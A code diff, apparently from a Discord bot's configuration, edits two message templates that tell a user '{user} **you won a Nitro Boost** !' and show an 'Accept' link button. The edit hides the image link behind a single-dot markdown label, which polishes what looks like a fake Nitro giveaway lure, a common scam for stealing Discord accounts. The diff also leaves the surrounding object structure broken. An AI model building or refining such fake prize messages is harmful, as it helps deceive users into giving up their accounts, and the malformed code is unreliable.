@@ -16,10 +16,7 @@
         embed: [
         {
             content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
-            components: {
-                type: 1,
-                components: [
-                    {
+            content: "{user} **you won a Nitro Boost** ! [.](https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&)",
                         type: 2,
                         label: "Accept",
                         style: 5,
@@ -37,11 +34,7 @@
 
     embed2: [
         {
-            content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
-            components: {
-                type: 1,
-                components: [
-                    {
+            content: "{user} **you won a Nitro Boost** ! [.](https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&)",
                         type: 2,
                         label: "Accept",
                         style: 5,
